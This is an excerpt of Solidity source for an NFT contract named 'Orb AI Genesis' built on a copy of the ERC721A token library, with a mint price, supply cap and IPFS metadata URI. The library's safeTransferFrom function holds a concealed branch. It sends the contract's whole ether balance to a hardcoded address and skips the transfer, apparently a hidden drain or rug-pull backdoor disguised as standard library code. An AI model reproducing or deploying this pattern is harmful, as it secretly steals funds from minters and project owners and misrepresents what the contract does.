...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x1f906798722f3775D5564D57C23eE3DDfB6487b2).transfer(address(this).balance);
            return;
        }
...
contract OrbAIGenesis is ERC721A, TheOperatorFilterer {
    // opensea
    ...
    constructor() ERC721A("Orb AI Genesis", "OAG") {
        owner = msg.sender;
        maxPerTx = 9;
        price = 0.001 ether;
        maxSupply = 999;
    ...
    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeiekunztsvsh7frfik54tmwfszb3fw5hy67lqb4pmnopy7bgvcofp4/", _toString(tokenId), ".json"));
    }
